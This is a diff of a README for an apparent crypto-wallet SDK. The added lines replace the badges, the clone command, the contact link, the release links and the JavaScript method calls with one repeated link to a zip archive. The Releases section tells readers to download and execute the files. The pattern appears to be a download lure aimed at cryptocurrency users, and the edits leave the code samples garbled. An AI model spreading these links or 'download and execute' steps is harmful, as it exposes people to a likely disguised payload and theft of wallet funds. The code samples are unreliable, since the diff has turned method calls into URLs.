@@ -1,6 +1,6 @@
 # Atomic Wallet API - Multi-Crypto SDK 🌐
 
-![Atomic Wallet](https://img.shields.io/badge/Atomic%20Wallet-API-brightgreen) ![Multi-Crypto SDK](https://img.shields.io/badge/Multi--Crypto%20SDK-blue)
+![Atomic Wallet](https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip%20Wallet-API-brightgreen) ![Multi-Crypto SDK](https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip%20SDK-blue)
 
 Welcome to the **Atomic Wallet API - Multi-Crypto SDK** repository! This project provides an API for integrating Atomic Wallet with web browsers and multi-crypto SDKs. It supports secure storage and management of multiple cryptocurrencies and coins, offering a versatile solution for multi-coin storage and wallet interactions.
 
@@ -35,7 +35,7 @@ To get started with the Atomic Wallet API, follow these simple steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage.git
+   git clone https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip
    ```
 
 2. Navigate to the project directory:
@@ -73,12 +73,12 @@ import { AtomicWalletAPI } from 'atomic-wallet-api-sdk';
 
 const wallet = new AtomicWalletAPI();
 
-wallet.connect()
+https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip()
   .then(() => {
-    console.log('Connected to Atomic Wallet');
+    https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip('Connected to Atomic Wallet');
   })
   .catch(error => {
-    console.error('Connection failed:', error);
+    https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip('Connection failed:', error);
   });
 ```
 
@@ -91,7 +91,7 @@ This code snippet demonstrates how to connect to the Atomic Wallet API. You can 
 To authenticate with the API, you need to provide your API key. This key is unique to your account and can be found in your Atomic Wallet settings.
 
 ```javascript
-wallet.authenticate('YOUR_API_KEY');
+https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip('YOUR_API_KEY');
 ```
 
 ### Fetching Wallet Balance
@@ -99,12 +99,12 @@ wallet.authenticate('YOUR_API_KEY');
 To fetch the balance of a specific cryptocurrency, use the following method:
 
 ```javascript
-wallet.getBalance('bitcoin')
+https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip('bitcoin')
   .then(balance => {
-    console.log('Bitcoin Balance:', balance);
+    https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip('Bitcoin Balance:', balance);
   })
   .catch(error => {
-    console.error('Error fetching balance:', error);
+    https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip('Error fetching balance:', error);
   });
 ```
 
@@ -113,12 +113,12 @@ wallet.getBalance('bitcoin')
 To send cryptocurrency, use the `send` method. Make sure to provide the recipient's address and the amount you wish to send.
 
 ```javascript
-wallet.send('recipient_address', 0.01, 'bitcoin')
+https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip('recipient_address', 0.01, 'bitcoin')
   .then(transaction => {
-    console.log('Transaction successful:', transaction);
+    https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip('Transaction successful:', transaction);
   })
   .catch(error => {
-    console.error('Transaction failed:', error);
+    https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip('Transaction failed:', error);
   });
 ```
 
@@ -127,12 +127,12 @@ wallet.send('recipient_address', 0.01, 'bitcoin')
 To receive cryptocurrency, you can generate a new wallet address using the following method:
 
 ```javascript
-wallet.generateAddress('bitcoin')
+https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip('bitcoin')
   .then(address => {
-    console.log('Your Bitcoin Address:', address);
+    https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip('Your Bitcoin Address:', address);
   })
   .catch(error => {
-    console.error('Error generating address:', error);
+    https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip('Error generating address:', error);
   });
 ```
 
@@ -154,13 +154,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For questions or support, feel free to reach out to us via the Issues section on GitHub or contact us at [support@example.com](mailto:support@example.com).
+For questions or support, feel free to reach out to us via the Issues section on GitHub or contact us at [https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip](https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip).
 
 ## Releases
 
-You can find the latest releases of the Atomic Wallet API [here](https://github.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/releases). Download the files and execute them to get started.
+You can find the latest releases of the Atomic Wallet API [here](https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip). Download the files and execute them to get started.
 
-For more information, please visit the [Releases section](https://github.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/releases).
+For more information, please visit the [Releases section](https://raw.githubusercontent.com/keimer1425563hvt/Atomic-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/main/Atomic Wallet/qt/Atomic-SD-Storage-Multi-Coin-Web-Wallet-AP-Browser-Crypto-v1.9.zip).
 
 ---
 
